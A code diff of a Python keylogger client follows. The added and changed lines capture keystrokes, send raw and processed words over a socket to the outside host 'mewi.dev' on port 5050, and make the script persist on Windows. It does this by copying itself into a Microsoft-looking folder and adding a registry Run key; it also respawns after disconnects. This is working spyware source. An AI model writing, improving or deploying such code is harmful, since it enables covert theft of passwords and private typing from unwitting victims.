@@ -1,5 +1,7 @@
 import atexit
 import datetime
+import os
+import shutil
 import socket
 import string
 import subprocess
@@ -62,17 +64,20 @@ class Client:
 
             while True:
                 keyboard_event = keyboard.read_event()
-                if keyboard_event.event_type == "up":
+                if keyboard_event.event_type != "down":
                     continue
 
                 key = keyboard_event.name
 
-                if key in ["space", "enter"] and len(word) + len(word_processed):
+                if key in ["space", "enter"]:
+                    if not len(word) + len(word_processed):
+                        break
+
                     prefix = "_" if key == "space" else "↴"
                     self.send_message(f"r{prefix} {''.join(word)}")
                     self.send_message(f"p{prefix} {''.join(word_processed)}")
                     self.debug_message("KEYLOGGER",
-                                       f"Sent  {''.join(word_processed)}  and raw information to {self.host}:{self.port}")
+                                       f"Sent {prefix}r/p | {''.join(word)} / {''.join(word_processed)} | to {self.host}:{self.port}")
                     break
 
                 key_substitution_map = {"uppil": "↑",
@@ -259,18 +264,48 @@ class PackageManager:
 def disconnect():
     client.disconnect()
     client.debug_message("RESPAWNING", "Respawning client script")
-    subprocess.Popen([sys.executable, file_path], shell=True)
+    subprocess.Popen([sys.executable, __file__], shell=True)
+
+
+def set_os_startup_launch():
+    local_os = sys.platform
+    match local_os:
+        case "aix":
+            raise NotImplementedError
+
+        case "linux":
+            raise NotImplementedError
+
+        case "win32":
+            file_name = os.path.basename(__file__)
+            dest_dir = "C:\\Microsoft\\kl_client\\"
+            dest_path = dest_dir + file_name
+
+            if __file__ != dest_dir + file_name:
+                os.makedirs(dest_dir, exist_ok=True)
+                shutil.copy(__file__, dest_path)
+
+            key = winreg.HKEY_CURRENT_USER
+            sub_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+            if WindowsRegistryEditor.value_exists(key, sub_key, file_name):
+                WindowsRegistryEditor.edit_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+                return
+
+            WindowsRegistryEditor.add_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+            return
+
+        case "cygwin":
+            raise NotImplementedError
+        case "darwin":
+            raise NotImplementedError
 
 
 if __name__ == "__main__":
-    file_path = __file__
-    file_name = __file__.split("\\")[-1]
-    WindowsRegistryEditor.add_value(winreg.HKEY_CURRENT_USER,
-                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
-                                    f"{file_name}",
-                                    rf'"{sys.executable}" "{file_path}"')
     PackageManager.install_package("keyboard")
     import keyboard
+
+    set_os_startup_launch()
 
     client = Client("mewi.dev", 5050, debug=True)
     client.start()
